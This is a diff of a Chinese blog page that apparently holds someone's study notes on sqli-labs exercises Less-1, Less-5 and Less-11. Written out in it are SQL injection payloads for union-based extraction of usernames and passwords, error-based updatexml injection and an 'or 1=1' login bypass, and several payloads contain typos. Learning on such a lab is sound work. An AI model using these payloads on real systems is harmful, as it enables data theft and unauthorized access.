@@ -35,18 +35,18 @@
 
   
   
-    <meta name="description" content="LESS-1 （get型）  寻找注入点 发送get请求，?id&#x3D;1,正常输出用户名和密码   判断闭合方式 ?id&#x3D;1’报错（语法错误） ?id&#x3D;-1’ or 1&#x3D;1–+正常输出(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行)   判断列数 ?id&#x3D;1’ order by 1,2,3,4;–+ 到4时报错，有3列   联合查询 查">
+    <meta name="description" content="LESS-1 （get型）  寻找注入点 发送get请求，?id&#x3D;1,正常输出用户名和密码   判断闭合方式 ?id&#x3D;1&#39;报错（语法错误） ?id&#x3D;-1&#39; or 1&#x3D;1--+正常输出(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行)   判断列数 ?id&#x3D;1&#39; order by 1,2,3,4;--+ 到4时报错，有3列   联合查询 &#x3D;&#x3D;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL">
 <meta property="og:url" content="https://chq576.github.io/2025/10/13/SQL/index.html">
 <meta property="og:site_name" content="尼采日记">
-<meta property="og:description" content="LESS-1 （get型）  寻找注入点 发送get请求，?id&#x3D;1,正常输出用户名和密码   判断闭合方式 ?id&#x3D;1’报错（语法错误） ?id&#x3D;-1’ or 1&#x3D;1–+正常输出(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行)   判断列数 ?id&#x3D;1’ order by 1,2,3,4;–+ 到4时报错，有3列   联合查询 查">
+<meta property="og:description" content="LESS-1 （get型）  寻找注入点 发送get请求，?id&#x3D;1,正常输出用户名和密码   判断闭合方式 ?id&#x3D;1&#39;报错（语法错误） ?id&#x3D;-1&#39; or 1&#x3D;1--+正常输出(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行)   判断列数 ?id&#x3D;1&#39; order by 1,2,3,4;--+ 到4时报错，有3列   联合查询 &#x3D;&#x3D;">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://chq576.github.io/img/less1.png">
 <meta property="og:image" content="https://chq576.github.io/img/less5.png">
 <meta property="og:image" content="https://chq576.github.io/img/less11.png">
 <meta property="article:published_time" content="2025-10-13T08:42:43.000Z">
-<meta property="article:modified_time" content="2025-10-18T11:20:23.234Z">
+<meta property="article:modified_time" content="2025-11-08T17:09:30.368Z">
 <meta property="article:author" content="cc">
 <meta property="article:tag" content="山竹&#39;菠萝">
 <meta name="twitter:card" content="summary">
@@ -255,7 +255,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Post</div>
-    <div class="sidebar-state-number">8</div>
+    <div class="sidebar-state-number">9</div>
   </div>
   <div class="sidebar-state-category">
     <div>Category</div>
@@ -342,7 +342,7 @@
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
     <time datetime="2025-10-13T08:42:43.000Z" itemprop="datePublished">2025-10-13</time>
-    <time style="display: none;" id="post-update-time">2025-10-18</time>
+    <time style="display: none;" id="post-update-time">2025-11-09</time>
   </span>
   
 </div>
@@ -360,60 +360,91 @@
         <h1 id="LESS-1-（get型）"><a href="#LESS-1-（get型）" class="headerlink" title="LESS-1 （get型）"></a>LESS-1 （get型）</h1><p><img src="/./img/less1.png" alt="图片"></p>
 <ol>
 <li>寻找注入点<ul>
-<li>发送get请求，?id&#x3D;1,正常输出用户名和密码</li>
+<li>发送get请求，<code>?id=1</code>,正常输出用户名和密码</li>
 </ul>
 </li>
 <li>判断闭合方式<ul>
-<li>?id&#x3D;1’报错（语法错误）</li>
-<li>?id&#x3D;-1’ or 1&#x3D;1–+正常输出(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行)</li>
+<li><code>?id=1&#39;</code>报错（语法错误）</li>
+<li><code>?id=-1&#39; or 1=1--+</code>正常输出(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行)</li>
 </ul>
 </li>
 <li>判断列数<ul>
-<li>?id&#x3D;1’ order by 1,2,3,4;–+ 到4时报错，有3列</li>
+<li><code>?id=1&#39; order by 1,2,3,4;--+</code> 到4时报错，有3列</li>
 </ul>
 </li>
 <li>联合查询<ul>
-<li>查回显，?id&#x3D;-1’ union select 1,2,3;–+ 发现2和3的位置可以显示（id要改成不存在的，才能确定回显）</li>
-<li>查库名，?id&#x3D;-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata;–+(group_concat用于合并查询到结果)</li>
-<li>查表名，?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’;–+</li>
-<li>查列名，?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’;–+</li>
-<li>查字段，?id&#x3D;-1’ union select 1,2,group_concat(concat_ws(‘~’,username,password) )from security.users;–+</li>
+<li>&#x3D;&#x3D;查回显&#x3D;&#x3D;</li>
 </ul>
-</li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3;--+` 发现2和3的位置可以显示（id要改成不存在的，才能确定回显）</span><br></pre></td></tr></table></figure>
+<ul>
+<li>&#x3D;&#x3D;查库名&#x3D;&#x3D;</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata;--+ #group_concat用于合并查询到结果</span><br></pre></td></tr></table></figure>
+<ul>
+<li>&#x3D;&#x3D;查表名&#x3D;&#x3D;</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;;--+</span><br></pre></td></tr></table></figure>
+<ul>
+<li>&#x3D;&#x3D;查列名&#x3D;&#x3D;</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;;--+</span><br></pre></td></tr></table></figure>
+<ul>
+<li>&#x3D;&#x3D;查字段&#x3D;&#x3D;</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(concat_ws(&#x27;~&#x27;,username,password) )from security.users;--+</span><br></pre></td></tr></table></figure></li>
 <li>补充<ul>
-<li>concat(str1,str2):连接成一个字符串</li>
-<li>concat_ws(07xe,str1,str2):与上面那个用法类似，但是可以指定分隔符</li>
-<li>group_concat:合并成一行显示</li>
+<li><code>concat(str1,str2)</code>:连接成一个字符串</li>
+<li><code>concat_ws(07xe,str1,str2)</code>:与上面那个用法类似，但是可以指定分隔符</li>
+<li><code>group_concat</code>:合并成一行显示</li>
 </ul>
 </li>
 </ol>
 <h1 id="LESS-5-（无回显）"><a href="#LESS-5-（无回显）" class="headerlink" title="LESS-5 （无回显）"></a>LESS-5 （无回显）</h1><p><img src="/./img/less5.png" alt="图片"></p>
 <ol>
 <li>确定没有回显，正确会输出”you are in…”</li>
-<li>用updatxml返回错误的参数信息<ul>
-<li>判断库名:?id&#x3D;1 ‘and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)–+</li>
-<li>判断表名:?id&#x3D;1’and updatexml(1,concat(0x7e,(select table_ name from<br>information schema.tables where table schema&#x3D;’security’),0x7e),1)–+</li>
-<li>判断列名:?id&#x3D;1’and updatexml(1,concat(0x7e.(select column_name from<br>information schema.columns where table schema&#x3D;’secunty and table name&#x3D;’emails’ ),0x7e),1)–+</li>
-<li>判断数据:?id&#x3D;1 ‘and updatexml(1.concat(Ox7e,(select id from emails limit 0.1),0x7e),1)–+</li>
+<li>用&#x3D;&#x3D;updatxml&#x3D;&#x3D;返回错误的参数信息<ul>
+<li>判断库名</li>
 </ul>
-</li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27;and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+<ul>
+<li>判断表名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,(select table_ name frominformation schema.tables where table schema=&#x27;security&#x27;),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+<ul>
+<li>判断列名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e.(select column_name frominformation schema.columns where table schema=&#x27;secunty and table name=&#x27;emails&#x27; ),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+<ul>
+<li>判断数据</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27;and updatexml(1.concat(Ox7e,(select id from emails limit 0.1),0x7e),1)--+</span><br></pre></td></tr></table></figure></li>
 <li>补充<ul>
-<li>extractvalue(1,concat(0x7e,(SELECT database()),0x7e))</li>
-<li>updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</li>
-<li>当参数的格式不正确而产生的错误，会返回参数的信息</li>
+<li><code>extractvalue(1,concat(0x7e,(SELECT database()),0x7e))</code></li>
+<li><code>updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</code></li>
+<li>二者都是当参数的格式不正确而产生错误时，会返回参数的信息</li>
 </ul>
 </li>
 </ol>
 <h1 id="LESS-11-（post型）"><a href="#LESS-11-（post型）" class="headerlink" title="LESS-11 （post型）"></a>LESS-11 （post型）</h1><p><img src="/./img/less11.png" alt="图片"></p>
 <ul>
-<li>bp拦截得到uname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit可以成功登录</li>
-<li>username&#x3D;admin’ or 1&#x3D;1#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</li>
-<li>判断列数，username&#x3D;admin’ order by 1,2;–+ 到3时报错，有2列,之后和less-1的类似</li>
-<li>查库名，union select 1,group_concat(schema_name) from information_schema.schemata;–+(group_concat用于合并查询到结果)</li>
-<li>查表名，union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’;–+</li>
-<li>查列名，union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’;–+</li>
-<li>查字段，union select 1,group_concat(concat_ws(‘~’,username,password) )from security.users;–+</li>
+<li>bp拦截得到<code>uname=admin&amp;passwd=admin&amp;submit=Submit</code>可以成功登录</li>
+<li><code>username=admin&#39; or 1=1#&amp;passwd=admin&amp;submit=Submit</code></li>
+<li>判断列数<code>username=admin&#39; order by 1,2;--+ </code>到3时报错，有2列,之后和less-1的类似</li>
+<li>查库名</li>
 </ul>
+   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(schema_name) from information_schema.schemata;--+(group_concat用于合并查询到结果)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查表名</li>
+</ul>
+   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;;--+</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查列名</li>
+</ul>
+   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;;--+</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查字段</li>
+</ul>
+   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(concat_ws(&#x27;~&#x27;,username,password) )from security.users;--+</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -424,7 +455,7 @@
     <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://chq576.github.io/2025/10/13/SQL/">https://chq576.github.io/2025/10/13/SQL/</a></p>
     <p><strong><span class="icon-pencil icon"></span>Title: </strong>「SQL」</p>
     <p><strong><span class="icon-calendar icon"></span>Published: </strong>2025-10-13 16:42:43</p>
-    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2025-10-18 19:20:23</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2025-11-09 01:09:30</p>
     <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
     <span class="icon-creative-commons article-copyright-bg"></span>
   </blockquote>
@@ -545,10 +576,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        3.7k
+        3.8k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        00:20
+        00:22
       </div>
     
     
@@ -593,7 +624,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Post</div>
-    <div class="sidebar-state-number">8</div>
+    <div class="sidebar-state-number">9</div>
   </div>
   <div class="sidebar-state-category">
     <div>Category</div>
@@ -741,9 +772,9 @@
           url: "https://chq576.github.io/2025/10/13/SQL/",
           excerpt: "",
           description: "",
-          stripContent: "LESS-1 （get型）  寻找注入点 发送get请求，?id&amp;#x3D;1,正常输出用户名和密码   判断闭合方式 ?id&amp;#x3D;1’报错（语法错误） ?id&amp;#x3D;-1’ or 1&amp;#x3D;1–+正常输出(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行)   判断列数 ?id&amp;#x3D;1’ order by 1,2,3,4;–+ 到4时报错，有3列   联合查询 查回显，?id&amp;#x3D;-1’ union select 1,2,3;–+ 发现2和3的位置可以显示",
+          stripContent: "LESS-1 （get型）  寻找注入点 发送get请求，?id=1,正常输出用户名和密码   判断闭合方式 ?id=1&amp;#39;报错（语法错误） ?id=-1&amp;#39; or 1=1--+正常输出(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行)   判断列数 ?id=1&amp;#39; order by 1,2,3,4;--+ 到4时报错，有3列   联合查询 &amp;#x3D;&amp;#x3D;查回显&amp;#x3D;&amp;#x3D;  1?id=-1&amp;#x27; union select 1,2,3;",
           date: "Mon Oct 13 2025 16:42:43 GMT+0800",
-          updated: "Sat Oct 18 2025 19:20:23 GMT+0800",
+          updated: "Sun Nov 09 2025 01:09:30 GMT+0800",
           cover: "/images/yh.jpg",
         };
       </script>
